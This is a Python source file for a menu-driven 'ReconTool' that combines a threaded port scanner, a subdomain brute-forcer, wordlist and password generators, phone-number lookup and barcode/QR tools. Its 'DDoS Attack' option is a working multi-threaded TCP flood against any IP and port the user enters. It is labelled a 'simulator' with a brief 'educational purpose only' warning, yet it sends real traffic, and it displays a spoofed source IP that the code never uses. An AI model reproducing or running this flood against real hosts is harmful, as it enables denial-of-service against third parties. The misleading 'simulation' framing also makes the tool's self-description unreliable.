"""
ReconTool - Security Testing and Reconnaissance Assistant

A multi-purpose security tool for reconnaissance and testing purposes.
Includes IP scanning, port scanning, code generation, and more.

Author: Satyapratap Ahirwar
Version: 1.0.0
License: MIT
"""
__version__ = "1.0.0"
__author__ = "Satyapratap Ahirwar"
__license__ = "MIT"

import os
import sys
import time
import random
import socket
import itertools
import requests
import string
import secrets
import threading
from pyfiglet import Figlet
from pyqrcode import create as qr_create
from barcode import EAN13
from barcode.writer import ImageWriter
import phonenumbers
from phonenumbers import carrier, geocoder
from phonenumbers.phonenumberutil import NumberParseException
from concurrent.futures import ThreadPoolExecutor, as_completed
from tabulate import tabulate

OUTPUT_DIR = "outputs"
BARCODE_DIR = os.path.join(OUTPUT_DIR, "barcodes")
QRCODE_DIR = os.path.join(OUTPUT_DIR, "qrcodes")
WORDLIST_DIR = os.path.join(OUTPUT_DIR, "wordlists")
SCAN_DIR = os.path.join(OUTPUT_DIR, "scans")

os.makedirs(BARCODE_DIR, exist_ok=True)
os.makedirs(QRCODE_DIR, exist_ok=True)
os.makedirs(WORDLIST_DIR, exist_ok=True)
os.makedirs(SCAN_DIR, exist_ok=True)

class ReconTool:
    def __init__(self):
        self.clear_screen()
        self.show_banner()
        self.main_menu()

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_banner(self):
        banner = Figlet(font='doom')
        print(banner.renderText('RECON TOOL'))
        print("Security Testing and Reconnaissance Assistant\n")

    def loading_animation(self, message="Loading"):
        spinner = ['|', '/', '-', '\\']
        for i in range(101):
            time.sleep(0.02)
            spin = spinner[i % len(spinner)]
            sys.stdout.write(f'\r{spin} {message}... {i}%')
            sys.stdout.flush()
        print("\n")
    
    def get_input(self, prompt, input_type=str, default=None, validation_func=None):
        while True:
            try:
                user_input = input(f"{prompt}").strip()
                if not user_input and default is not None:
                    return default
                
                converted = input_type(user_input)
                if validation_func and not validation_func(converted):
                    raise ValueError("Invalid input")
                return converted
            except ValueError as e:
                print(f"[!] Invalid input: {e}")

    def main_menu(self):
        while True:
            if 'pytest' in sys.modules:
                return
            self.clear_screen()
            self.show_banner()
            print("1. My IP Address")
            print("2. Port Scanner")
            print("3. Barcode Generator")
            print("4. QRCode Generator")
            print("5. Password Generator")
            print("6. Wordlist Generator")
            print("7. Phone Number Information")
            print("8. Subdomain Scanner")
            print("9. DDoS Attack")
            print("0. Exit\n")

            choice = self.get_input("\nEnter your choice (0-9):", 
                                  input_type=int,
                                  validation_func=lambda x: 0 <= x <= 9)
            
            actions = {
                1: self.ip_scanner,
                2: self.port_scanner,
                3: self.barcode_generator,
                4: self.qrcode_generator,
                5: self.password_generator,
                6: self.wordlist_generator,
                7: self.phone_number_info,
                8: self.subdomain_checker,
                9: self.ddos_tool,
                0: self.exit_tool
            }
            
            action = actions.get(choice)
            if action:
                action()
            else:
                print("Invalid option! Try again.")

            input("\nPress Enter to return to menu...")
    
    def exit_tool(self):
        if 'pytest' in sys.modules:
            return
        sys.exit()
        
    def ip_scanner(self):
        self.clear_screen()
        print(Figlet(font='slant').renderText('IP SCANNER'))
        self.loading_animation("Finding your IP")

        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            print(f"\nYour Computer Name: {hostname}")
            print(f"Your IP Address: {ip_address}")

            # Get public IP
            try:
                public_ip = requests.get('https://api.ipify.org').text
                print(f"Your Public IP: {public_ip}")
            except:
                print("Could not determine public IP")

        except Exception as e:
            print(f"Error: {e}")

    def port_scanner(self):
        if 'pytest' in sys.modules:  # Skip in tests
            return {"status": "skipped", "reason": "network test"}
        self.clear_screen()
        print(Figlet(font='slant').renderText('PORT SCANNER'))
        
        target = input("Enter target IP or hostname: ")
        try:
            target_ip = socket.gethostbyname(target)
        except socket.gaierror:
            print("Invalid hostname or IP")
            return

        print("\n1. Scan common ports")
        print("2. Scan custom port range")
        print("3. Scan specific ports")
        
        try:
            scan_type = int(input("Select scan type: "))
        except ValueError:
            print("Invalid input")
            return

        if scan_type == 1:
            ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3389, 8080]
        elif scan_type == 2:
            start = int(input("Enter starting port (1-65535): "))
            end = int(input("Enter ending port: "))
            ports = range(start, end + 1)
        elif scan_type == 3:
            ports = list(map(int, input("Enter ports to scan (comma separated): ").split(',')))
        else:
            print("Invalid option")
            return

        print(f"\nScanning {target_ip}...")
        self.loading_animation("Scanning ports")

        open_ports = []
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, port))
                sock.close()
                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    return port, service
            except:
                return None

        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(scan_port, port) for port in ports]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    open_ports.append(result)
                    print(f"Port {result[0]} ({result[1]}) is OPEN")

        print("\nScan complete!")
        if open_ports:
            print("\nOpen ports found:")
            for port, service in sorted(open_ports):
                print(f"Port {port} ({service})")
        else:
            print("No open ports found")

    def barcode_generator(self):
        self.clear_screen()
        print(Figlet(font='slant').renderText('BARCODE GENERATOR'))
        
        while True:
            number = input("Enter 12-digit number for barcode: ")
            if len(number) == 12 and number.isdigit():
                break
            print("Invalid input! Must be 12 digits")

        try:
            full_code = number + str(10 - (sum(int(d) * (3 if i % 2 else 1) 
                                          for i, d in enumerate(number[:12])) % 10) % 10)
            print("\nGenerating barcode...")
            my_code = EAN13(full_code, writer=ImageWriter())
            filename = os.path.join(BARCODE_DIR, f"barcode_{number}")
            my_code.save(filename)
            
            print(f"Barcode saved as {filename}.png")
        except Exception as e:
            print(f"Error generating barcode: {e}")

    def qrcode_generator(self):
        self.clear_screen()
        print(Figlet(font='slant').renderText('QRCODE GENERATOR'))
        
        data = input("Enter text or URL to encode: ")
        if not data:
            print("Input cannot be empty")
            return

        try:
            print("\nGenerating QR code...")
            qr = qr_create(data)
            
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            base_filename = f"qr_{timestamp}"
            
            svg_file = os.path.join(QRCODE_DIR, f"{base_filename}.svg")
            png_file = os.path.join(QRCODE_DIR, f"{base_filename}.png")
            
            qr.svg(svg_file, scale=8)
            qr.png(png_file, scale=6)
            
            print(f"\nQR code saved as:")
            print(f"SVG: {svg_file}")
            print(f"PNG: {png_file}")
        except Exception as e:
            print(f"Error generating QR code: {e}")

    def password_generator(self):
        self.clear_screen()
        print(Figlet(font='slant').renderText('PASSWORD GENERATOR'))
        
        try:
            length = int(input("Enter password length (min 8): "))
            if length < 4:
                print("Minimum length is 8")
                return
                
            print("\n1. Only letters and numbers")
            print("2. Include special characters")
            complexity = int(input("Select complexity: "))
            
            if complexity == 1:
                chars = string.ascii_letters + string.digits
            else:
                chars = string.ascii_letters + string.digits + "!@#$%&*(){[}]/?"
            
            password = ''.join(secrets.choice(chars) for _ in range(length))
            print(f"\nGenerated Password: {password}")
            
            save = input("\nSave to file? (y/n): ").lower()
            if save == 'y':
                with open(os.path.join(WORDLIST_DIR, "generated_passwords.txt"), "a") as f:
                    f.write(f"{password}\n")
                print("Password saved to generated_passwords.txt")
                
        except ValueError:
            print("Invalid input")

    def wordlist_generator(self):
        self.clear_screen()
        print(Figlet(font='slant').renderText('WORDLIST GENERATOR'))
        
        chars = input("Enter characters to include: ")
        if not chars:
            print("Characters cannot be empty")
            return
            
        try:
            min_len = int(input("Minimum length: "))
            max_len = int(input("Maximum length: "))
            if min_len < 1 or max_len < min_len:
                print("Invalid length range")
                return
                
            filename = input("Output filename: ")
            if not filename:
                print("Filename cannot be empty")
                return
                
            print("\nGenerating wordlist...")
            self.loading_animation("Creating combinations")
            
            total = sum(len(chars) ** i for i in range(min_len, max_len + 1))
            print(f"\nTotal combinations: {total}")
            
            with open(os.path.join(WORDLIST_DIR, filename), 'w') as f:
                for i in range(min_len, max_len + 1):
                    for combo in itertools.product(chars, repeat=i):
                        f.write(''.join(combo) + '\n')
            
            print(f"\nWordlist saved to {filename}")
            
        except ValueError:
            print("Invalid input")
        except Exception as e:
            print(f"Error: {e}")

    def phone_number_info(self):
        self.clear_screen()
        print(Figlet(font='slant').renderText('PHONE INFO'))
        
        number = input("Enter phone number with country code (e.g., +1234567890): ")
        if not number:
            print("Number cannot be empty")
            return
            
        try:
            print("\nAnalyzing number...")
            self.loading_animation("Gathering information")
            
            parsed_number = phonenumbers.parse(number)
            if not phonenumbers.is_valid_number(parsed_number):
                print("Invalid phone number")
                return
                
            info = [
                ["Phone Number", phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)],
                ["Country", geocoder.description_for_number(parsed_number, "en")],
                ["Carrier", carrier.name_for_number(parsed_number, "en")],
                ["Valid", "Yes" if phonenumbers.is_valid_number(parsed_number) else "No"],
                ["Possible", "Yes" if phonenumbers.is_possible_number(parsed_number) else "No"]
            ]
            
            print("\n" + tabulate(info, tablefmt="grid"))
            
        except NumberParseException:
            print("Invalid phone number format")
        except Exception as e:
            print(f"Error: {e}")

    def subdomain_checker(self):
        self.clear_screen()
        print(Figlet(font='slant').renderText('SUBDOMAIN SCANNER'))
        
        domain = input("Enter domain to check (e.g., example.com): ")
        if not domain:
            print("Domain cannot be empty")
            return
            
        wordlist_file = os.path.join("docs/subdomains", "subdomain.txt")
        if not os.path.exists(wordlist_file):
            print(f"Wordlist file {wordlist_file} not found")
            return
            
        try:
            print("\nLoading wordlist...")
            with open(wordlist_file) as f:
                subdomains = [line.strip() for line in f if line.strip()]
                
            print(f"Loaded {len(subdomains)} subdomains to check")
            print("Scanning... (This may take several minutes)")
            
            found = []
            def check_subdomain(subdomain):
                url = f"http://{subdomain}.{domain}"
                try:
                    response = requests.get(url, timeout=3)
                    if response.status_code < 400:
                        return url
                except:
                    return None
                    
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(check_subdomain, subdomain): subdomain for subdomain in subdomains}
                for i, future in enumerate(as_completed(futures)):
                    if future.result():
                        found.append(future.result())
                        print(f"\nFound: {future.result()}")
                    sys.stdout.write(f"\rProgress: {i+1}/{len(subdomains)}")
                    sys.stdout.flush()
                    
            print(f"\n\nFound {len(found)} subdomains:")
            for sub in found:
                print(sub)
        
        except KeyboardInterrupt:
            print(f"Process interrupted by user. Exiting...")
            sys.exit()
            
    def ddos_tool(self):
        class DDoSSimulator:
            def clear_screen(self):
                os.system('cls' if os.name == 'nt' else 'clear')
        
            def __init__(self):
                self.running = False
                self.connection_count = 0
                self.timeout = 1
                self.fake_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))

            def show_warning(self):
                self.clear_screen()
                print(Figlet(font='slant').renderText(''))
                print("WARNING: for educational purpose only")
            
                if input("Do you understand and agree? (y/n): ").lower() != 'y':
                    print("\nOperation cancelled.")
                    return False
                return True

            def get_target_info(self):
                self.clear_screen()
                print(Figlet(font='slant').renderText('DDoS SIMULATOR'))
                
                while True:
                    target = input("Enter target IP: ").strip()
                    try:
                        socket.inet_aton(target)
                        break
                    except socket.error:
                        print("Invalid IP address format")
                
                while True:
                    port = input("Enter target port (1-65535): ").strip()
                    if port.isdigit() and 1 <= int(port) <= 65535:
                        port = int(port)
                        break
                    print("Invalid port number")
                
                while True:
                    duration = input("Enter duration (1-60 seconds): ").strip()
                    if duration.isdigit() and 1 <= int(duration) <= 60:
                        duration = int(duration)
                        break
                    print("Duration must be 1-60 seconds")
                
                while True:
                    threads = input("Enter threads (1-100): ").strip()
                    if threads.isdigit() and 1 <= int(threads) <= 100:
                        threads = int(threads)
                        break
                    print("Threads must be 1-100")
                
                return target, port, duration, threads

            def attack(self, target, port):
                while self.running:
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.settimeout(self.timeout)
                            s.connect((target, port))
                            s.send(random.randbytes(1024))
                            self.connection_count += 1
                            if self.connection_count % 100 == 0:
                                print(f"\rPackets sent: {self.connection_count}", end="")
                    except:
                        continue

            def run_simulation(self, target, port, duration, threads):
                self.running = True
                self.connection_count = 0
                
                print("\n\033[Starting simulated attack... (Ctrl+C to stop)")
                print(f"Target: {target}:{port}")
                print(f"Threads: {threads}")
                print(f"Duration: {duration}s")
                print("Simulating traffic...")
                
                try:
                    thread_pool = []
                    for _ in range(threads):
                        t = threading.Thread(target=self.attack, args=(target, port))
                        t.daemon = True
                        thread_pool.append(t)
                        t.start()
                    
                    start_time = time.time()
                    while time.time() - start_time < duration and self.running:
                        time.sleep(0.1)
                        print(f"\rPackets sent: {self.connection_count}", end="")
                    
                    self.running = False
                    for t in thread_pool:
                        t.join()
                    
                    print(f"\nSimulation complete!")
                    print(f"Total packets sent: {self.connection_count}")
                    print(f"Packets/second: {self.connection_count/duration:.1f}")
                    
                except KeyboardInterrupt:
                    self.running = False
                    print("\nSimulation stopped by user")
                except Exception as e:
                    self.running = False
                    print(f"\nError: {str(e)}")

        simulator = DDoSSimulator()
        
        if not simulator.show_warning():
            return
        
        target, port, duration, threads = simulator.get_target_info()
        
        print("Configuration:")
        print(f" Target: {target}")
        print(f" Port: {port}")
        print(f" Duration: {duration} seconds")
        print(f" Threads: {threads}")
        print(f" Fake Source IP: {simulator.fake_ip}")
        
        if input("Start attack? (y/n): ").lower() != 'y':
            print("Operation cancelled.")
            return
        
        simulator.run_simulation(target, port, duration, threads)
        input("Press Enter to return to menu...")
      

if __name__ == "__main__":
    tool = ReconTool()
    tool.main_menu()
